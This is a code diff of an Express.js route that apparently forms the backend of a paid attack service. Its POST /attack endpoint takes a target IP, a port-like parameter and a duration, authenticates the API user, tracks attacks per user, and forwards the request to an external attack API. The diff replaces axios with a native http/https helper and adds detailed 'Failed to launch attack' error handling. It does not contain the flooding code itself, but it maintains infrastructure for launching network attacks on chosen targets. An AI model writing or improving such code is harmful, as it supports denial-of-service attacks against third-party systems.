@@ -1,12 +1,72 @@
-// routes/apiExternal.js - UPDATED with proper external API call
+// routes/apiExternal.js - UPDATED with native http/https module
 const express = require('express');
 const router = express.Router();
-const axios = require('axios');
+// const axios = require('axios'); // REMOVE THIS LINE
 const { v4: uuidv4 } = require('uuid');
 const { authenticateApiUser } = require('../middleware/apiAuthMiddleware');
 const ApiUser = require('../models/ApiUser');
 const attackTracker = require('../services/attackTracker');
 const serveron = true
+
+// Helper function to make HTTP/HTTPS request
+async function makeHttpRequest(url, data, headers, timeout = 15000) {
+    const apiUrl = new URL(url);
+    const isHttps = apiUrl.protocol === 'https:';
+    const httpModule = isHttps ? require('https') : require('http');
+    
+    const requestData = JSON.stringify(data);
+    
+    return new Promise((resolve, reject) => {
+        const options = {
+            hostname: apiUrl.hostname,
+            port: apiUrl.port || (isHttps ? 443 : 80),
+            path: apiUrl.pathname + apiUrl.search,
+            method: 'POST',
+            headers: {
+                ...headers,
+                'Content-Length': Buffer.byteLength(requestData)
+            },
+            timeout: timeout
+        };
+        
+        const request = httpModule.request(options, (response) => {
+            let responseData = '';
+            
+            response.on('data', (chunk) => {
+                responseData += chunk;
+            });
+            
+            response.on('end', () => {
+                let parsedData;
+                try {
+                    parsedData = responseData ? JSON.parse(responseData) : {};
+                } catch (e) {
+                    parsedData = {};
+                }
+                
+                resolve({
+                    statusCode: response.statusCode,
+                    headers: response.headers,
+                    data: parsedData,
+                    rawData: responseData
+                });
+            });
+        });
+        
+        request.on('error', (error) => {
+            reject(error);
+        });
+        
+        request.on('timeout', () => {
+            request.destroy();
+            reject(new Error('Request timeout'));
+        });
+        
+        request.write(requestData);
+        request.end();
+    });
+}
+
 // Apply authentication middleware
 router.use(authenticateApiUser);
 
@@ -96,9 +156,10 @@ router.post('/attack', async (req, res) => {
                 details: 'API key not configured'
             });
         }
+        
         try {
-            // Call external API with the exact format you specified
-            const externalResponse = await axios.post(
+            // Call external API with native http/https module
+            const externalResponse = await makeHttpRequest(
                 externalApiUrl,
                 {
                     param1: ip,      // IP address
@@ -106,24 +167,21 @@ router.post('/attack', async (req, res) => {
                     param3: durationSec  // Duration in seconds
                 },
                 {
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'x-api-key': externalApiKey
-                    },
-                    timeout: 15000,
-                    validateStatus: (status) => true // Don't throw on any status
-                }
+                    'Content-Type': 'application/json',
+                    'x-api-key': externalApiKey
+                },
+                15000 // timeout in ms
             );
 
-            console.log(`[API Attack] External API response status: ${externalResponse.status}`);
+            console.log(`[API Attack] External API response status: ${externalResponse.statusCode}`);
             console.log(`[API Attack] External API response data:`, externalResponse.data);
 
             // Check if external API call was successful (status 200)
-            if (externalResponse.status !== 200) {
-                console.error(`[API Attack] External API returned non-200 status: ${externalResponse.status}`);
+            if (externalResponse.statusCode !== 200) {
+                console.error(`[API Attack] External API returned non-200 status: ${externalResponse.statusCode}`);
                 return res.status(500).json({
                     error: 'Failed to launch attack',
-                    message: `External service returned status ${externalResponse.status}`,
+                    message: `External service returned status ${externalResponse.statusCode}`,
                     details: 'Service temporarily unavailable'
                 });
             }
@@ -221,9 +279,32 @@ router.post('/attack', async (req, res) => {
 
         } catch (externalError) {
             console.error('[API Attack] External API error:', externalError.message);
-            if (externalError.response) {
-                console.error('[API Attack] Response status:', externalError.response.status);
-                console.error('[API Attack] Response data:', externalError.response.data);
+            
+            // Check for specific error types from native http module
+            if (externalError.code === 'ECONNREFUSED') {
+                return res.status(500).json({
+                    error: 'Failed to launch attack',
+                    message: 'Connection refused - External service is not available',
+                    details: 'Service temporarily unavailable'
+                });
+            } else if (externalError.code === 'ECONNRESET') {
+                return res.status(500).json({
+                    error: 'Failed to launch attack',
+                    message: 'Connection reset - External service closed the connection',
+                    details: 'Service temporarily unavailable'
+                });
+            } else if (externalError.code === 'ETIMEDOUT' || externalError.message === 'Request timeout') {
+                return res.status(500).json({
+                    error: 'Failed to launch attack',
+                    message: 'Request timeout - External service did not respond in time',
+                    details: 'Service temporarily unavailable'
+                });
+            } else if (externalError.code === 'ENOTFOUND') {
+                return res.status(500).json({
+                    error: 'Failed to launch attack',
+                    message: 'DNS lookup failed - External service address cannot be resolved',
+                    details: 'Service configuration error'
+                });
             }
 
             res.status(500).json({
